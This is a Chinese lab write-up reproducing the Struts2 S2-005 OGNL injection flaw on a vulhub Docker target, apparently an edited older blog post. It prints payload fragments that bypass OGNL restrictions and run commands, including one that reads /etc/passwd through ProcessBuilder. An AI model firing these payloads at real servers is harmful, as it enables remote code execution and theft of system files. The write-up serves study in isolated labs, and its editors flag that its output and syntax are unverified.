ailx10说：这篇是2024年9月之前写的，后来又改过。S2-005 这一篇，我继续试 Struts2 对表达式的限制是怎样被绕开的。先从参数名和编码入手，调整成员访问相关的设置，用文件标记确认动作，再尝试看输出、下载和执行。做完会发现，长载荷里其实塞着好几件不同的事，不拆开就很难知道哪一步出了问题。原笔记还混有需要再核对的回显写法，所以它更适合对着旧靶场逐段看；能记住限制和绕过之间的关系，比只记住一个编号有用。

历史靶场代码和地址未重跑，以下输出仅反映原作者的记录。请在经授权的隔离环境中验证版本、配置、请求字节和结果。

原实验观察参数过滤和表达式调用；受影响版本应以对应官方安全公告为准。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后在确认项目目录和 Compose 配置后关闭本项目服务；原文中的全局 Docker 清理命令已移除。

（1）命令执行，创建文件（无回显）

设置 `_memberAccess` 对象的 `allowStaticMethodAccess` 属性为 `true`

```
?('#_memberAccess['allowStaticMethodAccess']')(vaaa)=true
```

设置 `_context` 对象的 `xwork.MethodAccessor.denyMethodExecution` 属性为 `false`

```
&(aaaa)((#context['xwork.MethodAccessor.denyMethodExecution']=#vccc)(#vccc=new java.lang.Boolean("false")))
```

使用 Java 的 `Runtime.getRuntime().exec()` 方法执行 `touch /tmp/ailx10` 命令


获取当前请求的 `HttpServletRequest` 对象

```
#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest')
```

Scanner 的 useDelimiter 使用正则定义分隔模式；原文所写的转义方式及匹配效果需按 Java 字符串层核验，不能说没有实际作用。

```
#s=new java.util.Scanner((new java.lang.ProcessBuilder('cat /etc/passwd'.toString().split(' '))).start().getInputStream()).useDelimiter('\AAAA')
```

从命令的输出流中读取数据，并保存到变量 `#str` 中

